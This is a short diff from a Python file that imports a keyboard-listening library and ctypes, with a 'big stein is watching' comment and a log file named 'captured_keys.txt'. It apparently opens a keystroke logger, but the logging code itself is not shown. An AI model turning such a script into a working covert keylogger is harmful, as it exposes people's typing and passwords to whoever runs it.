@@ -1,7 +1,6 @@
 import pynput.keyboard as keyboard
 import ctypes
 import time
-
 #big stein is watching 
 
 log_name = "captured_keys.txt"
